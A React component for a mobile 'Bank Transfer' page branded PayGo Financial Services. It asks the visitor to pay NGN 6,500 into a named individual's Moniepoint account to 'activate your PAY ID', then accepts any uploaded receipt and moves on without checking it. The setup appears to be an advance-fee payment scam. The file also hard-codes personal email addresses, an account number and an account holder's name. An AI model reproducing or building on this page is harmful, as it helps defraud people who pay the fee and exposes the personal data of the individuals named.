import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { ArrowLeft } from "lucide-react";
import { toast } from "sonner";

const BankTransfer = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [userEmail, setUserEmail] = useState("stevenorumujia@gmail.com");
  const [receipt, setReceipt] = useState<File | null>(null);

  const handleCopyAmount = () => {
    navigator.clipboard.writeText("6500");
    toast.success("Amount copied to clipboard");
  };

  const handleCopyAccount = () => {
    navigator.clipboard.writeText("8102562883");
    toast.success("Account number copied to clipboard");
  };

  const handleReceiptUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setReceipt(file);
      toast.success("Receipt uploaded successfully");
    }
  };

  const handleConfirmTransfer = () => {
    if (!userEmail) {
      toast.error("Please enter your email address");
      return;
    }
    if (!receipt) {
      toast.error("Please upload your payment receipt");
      return;
    }
    navigate("/payment-confirmation");
  };

  return (
    <div className="flex justify-center min-h-screen bg-gray-50">
      <div className="w-full max-w-sm bg-white">
        <header className="bg-gradient-to-r from-[#9b20f5] to-[#ff6f43] p-3 text-white flex items-center">
          <ArrowLeft className="mr-3 cursor-pointer" onClick={() => navigate(-1)} />
          <h1 className="text-lg font-bold">Bank Transfer</h1>
        </header>
        
        <div className="p-4 space-y-3">
          {/* Profile section */}
          <div className="flex items-center space-x-3 mb-3">
            <div className="w-10 h-10 bg-gradient-to-br from-purple-500 via-pink-500 to-orange-500 rounded-full flex items-center justify-center">
              <div className="w-5 h-5 bg-white rounded-full flex items-center justify-center">
                <div className="w-1.5 h-1.5 bg-orange-400 rounded-full"></div>
              </div>
            </div>
            <div>
              <h2 className="text-lg font-bold text-black">**NGN 6,500**</h2>
              <p className="text-gray-600 text-xs">benjamincharis15@gmail.com</p>
            </div>
          </div>

          <p className="text-gray-700 text-sm mb-3">Complete this bank transfer to proceed</p>

          {/* Amount */}
          <div className="space-y-1">
            <label className="text-gray-600 text-sm">Amount</label>
            <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
              <span className="text-lg font-extrabold text-black">NGN 6,500</span>
              <Button 
                onClick={handleCopyAmount}
                className="bg-gradient-to-r from-[#9b20f5] to-[#ff6f43] hover:opacity-90 text-white px-4 py-1 rounded-full text-xs font-medium"
              >
                Copy
              </Button>
            </div>
          </div>

          {/* Account Number */}
          <div className="space-y-1">
            <div className="flex items-center space-x-2">
              <div className="w-5 h-5 bg-blue-600 rounded flex items-center justify-center text-white text-xs">
                💳
              </div>
              <label className="text-gray-600 text-sm">Account Number</label>
            </div>
            <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
              <span className="text-lg font-extrabold text-black">8102562883</span>
              <Button 
                onClick={handleCopyAccount}
                className="bg-gradient-to-r from-[#9b20f5] to-[#ff6f43] hover:opacity-90 text-white px-4 py-1 rounded-full text-xs font-medium"
              >
                Copy
              </Button>
            </div>
          </div>

          {/* Bank Name */}
          <div className="space-y-1">
            <div className="flex items-center space-x-2">
              <div className="w-5 h-5 bg-gray-600 rounded flex items-center justify-center text-white text-xs">
                🏛️
              </div>
              <label className="text-gray-600 text-sm">Bank Name</label>
            </div>
            <div className="bg-gray-50 p-3 rounded-lg">
              <span className="text-lg font-extrabold text-black">Moniepoint Bank</span>
            </div>
          </div>

          {/* Account Name */}
          <div className="space-y-1">
            <div className="flex items-center space-x-2">
              <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs">
                👤
              </div>
              <label className="text-gray-600 text-sm">Account Name</label>
            </div>
            <div className="bg-gray-50 p-3 rounded-lg">
              <span className="text-lg font-extrabold text-black">CHARIS SOMTOCHUKWU CHISOM</span>
            </div>
          </div>

          <p className="text-gray-600 text-sm leading-relaxed py-2">
            Kindly proceed with the payment for your PAY ID. Complete the bank transfer to activate your PAY ID
          </p>

          {/* Email Input */}
          <div className="space-y-1">
            <Input 
              type="email"
              value={userEmail}
              onChange={(e) => setUserEmail(e.target.value)}
              className="h-10 border-gray-300 rounded-lg text-gray-700 text-sm"
              readOnly
            />
          </div>

          {/* File Upload */}
          <div className="space-y-1">
            <div className="relative">
              <input 
                type="file"
                accept="image/*,.pdf"
                onChange={handleReceiptUpload}
                className="w-full p-3 border border-gray-300 rounded-lg file:mr-3 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-gray-100 file:text-gray-700 hover:file:bg-gray-200 text-sm"
              />
              {!receipt && <span className="text-gray-500 text-sm absolute right-3 top-3">No file chosen</span>}
            </div>
          </div>

          {/* Submit Button */}
          <Button 
            onClick={handleConfirmTransfer}
            disabled={!receipt || !userEmail}
            className="w-full bg-gradient-to-r from-[#9b20f5] to-[#ff6f43] hover:opacity-90 disabled:bg-gray-300 disabled:cursor-not-allowed text-white text-sm py-4 rounded-full mt-4 font-medium"
          >
            I have made payment
          </Button>
        </div>
        
        <footer className="bg-gray-100 p-3 text-center text-gray-600">
          <p className="text-sm">PayGo Financial Services LTD</p>
        </footer>
      </div>
    </div>
  );
};

export default BankTransfer;